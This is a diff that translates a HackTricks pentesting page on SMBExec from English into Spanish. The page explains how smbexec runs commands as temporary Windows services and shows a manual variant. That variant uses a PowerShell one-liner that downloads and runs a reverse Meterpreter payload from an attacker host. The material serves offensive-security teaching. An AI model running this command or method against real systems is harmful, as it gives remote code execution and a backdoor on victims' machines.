@@ -4,70 +4,52 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## How does it works
+## ¿Cómo funciona?
 
-**Smbexec works like Psexec.** In this example\*\*,\*\* **instead** of pointing the "_binpath_" to a malicious executable inside the victim, we are going to **point it** to **cmd.exe or powershell.exe** and one of they will download and execute the backdoor.
+**Smbexec funciona como Psexec.** En este ejemplo, **en lugar** de apuntar el "_binpath_" a un ejecutable malicioso dentro de la víctima, vamos a **apuntarlo** a **cmd.exe o powershell.exe** y uno de ellos descargará y ejecutará la puerta trasera.
 
 ## **SMBExec**
 
-Let's see what happens when smbexec runs by looking at it from the attackers and target's side:
+Veamos qué sucede cuando se ejecuta smbexec mirándolo desde el lado del atacante y del objetivo:
 
 ![](../../.gitbook/assets/smbexec\_prompt.png)
 
-So we know it creates a service "BTOBTO". But that service isn't present on the target machine when we do an `sc query`. The system logs reveal a clue to what happened:
+Así que sabemos que crea un servicio "BTOBTO". Pero ese servicio no está presente en la máquina objetivo cuando hacemos una `sc query`. Los registros del sistema revelan una pista de lo que sucedió:
 
 ![](../../.gitbook/assets/smbexec\_service.png)
 
-The Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe). It echoes the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Back on Kali, the Python script then pulls the output file via SMB and displays the contents in our "pseudo-shell". For every command we type into our "shell", a new service is created and the process is repeated. This is why it doesn't need to drop a binary, it just executes each desired command as a new service. Definitely more stealthy, but as we saw, an event log is created for every command executed. Still a very clever way to get a non-interactive "shell"!
+El nombre del archivo de servicio contiene una cadena de comando para ejecutar (%COMSPEC% apunta a la ruta absoluta de cmd.exe). Imprime el comando a ejecutar en un archivo bat, redirige la salida estándar y de error a un archivo Temp, luego ejecuta el archivo bat y lo elimina. De vuelta en Kali, el script de Python luego extrae el archivo de salida a través de SMB y muestra el contenido en nuestra "pseudo-shell". Para cada comando que escribimos en nuestra "shell", se crea un nuevo servicio y se repite el proceso. Es por eso que no necesita dejar un binario, simplemente ejecuta cada comando deseado como un nuevo servicio. Definitivamente más sigiloso, pero como vimos, se crea un registro de eventos para cada comando ejecutado. ¡Todavía es una forma muy inteligente de obtener una "shell" no interactiva!
 
-## Manual SMBExec
+## SMBExec manual
 
-**Or executing commands via services**
+**O ejecución de comandos a través de servicios**
 
-As smbexec demonstrated, it's possible to execute commands directly from service binPaths instead of needing a binary. This can be a useful trick to keep in your back pocket if you need to just execute one arbitrary command on a target Windows machine. As a quick example, let's get a Meterpreter shell using a remote service _without_ a binary.
+Como smbexec demostró, es posible ejecutar comandos directamente desde los binPaths del servicio en lugar de necesitar un binario. Este puede ser un truco útil para tener en tu bolsillo si necesitas ejecutar solo un comando arbitrario en una máquina Windows objetivo. Como ejemplo rápido, obtengamos una shell de Meterpreter usando un servicio remoto _sin_ un binario.
 
-We'll use Metasploit's `web_delivery` module and choose a PowerShell target with a reverse Meterpreter payload. The listener is set up and it tells us the command to execute on the target machine:
-
+Usaremos el módulo `web_delivery` de Metasploit y elegiremos un objetivo de PowerShell con un payload inverso de Meterpreter. Se configura el oyente y nos dice el comando a ejecutar en la máquina objetivo:
 ```
 powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');  
 ```
+Desde nuestra máquina de ataque de Windows, creamos un servicio remoto ("metpsh") y establecemos el binPath para ejecutar cmd.exe con nuestra carga útil:
 
-From our Windows attack box, we create a remote service ("metpsh") and set the binPath to execute cmd.exe with our payload:
+![](../../.gitbook/assets/sc_psh_create.png)
 
-![](../../.gitbook/assets/sc\_psh\_create.png)
+Y luego lo iniciamos:
 
-And then start it:
+![](../../.gitbook/assets/sc_psh_start.png)
 
-![](../../.gitbook/assets/sc\_psh\_start.png)
+Da un error porque nuestro servicio no responde, pero si miramos nuestro listener de Metasploit, vemos que se hizo la llamada de retorno y se ejecutó la carga útil.
 
-It errors out because our service doesn't respond, but if we look at our Metasploit listener we see that the callback was made and the payload executed.
-
-All the info was extracted from here: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
+Toda la información fue extraída de aquí: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
